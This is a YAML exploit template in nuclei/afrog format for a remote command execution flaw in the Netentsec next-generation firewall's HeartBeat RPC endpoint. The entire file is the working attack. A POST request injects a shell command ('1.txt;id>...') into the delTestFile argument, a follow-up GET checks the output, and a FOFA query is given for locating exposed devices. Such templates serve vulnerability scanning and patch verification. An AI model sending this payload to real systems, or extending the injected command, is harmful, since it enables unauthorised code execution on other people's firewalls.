id: netentsec-fiewall-heartbeat-php-rce

info:
  name: 网康下一代防火墙 HeartBeat.php 远程命令执行
  author: zan8in
  severity: high
  description: |
    网康下一代防火墙 NS_Rpc_HeartBeat delTestFile 接口存在命令拼接，可通过写入本地文件并匹配 id 输出进行概念验证，不使用反连。
  reference:
    - https://github.com/zan8in/afrog-pocs/blob/main/vulnerability/netentsec-fiewall-heartbeat-php-rce.yaml
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  metadata:
    max-request: 2
    fofa-query: app="网康科技-下一代防火墙"
    verified: false
  tags: netentsec,rce,网康,firewall,ngfw

http:
  - raw:
      - |
        POST /directdata/direct/router HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"action":"NS_Rpc_HeartBeat","method":"delTestFile","data": ["/var/www/tmp/1.txt;id>{{randstr}}.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}

      - |
        GET /{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - '"NS_Rpc_HeartBeat"'
          - '"action":'
        condition: and

      - type: regex
        part: body_2
        regex:
          - '((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)'

      - type: status
        status:
          - 200
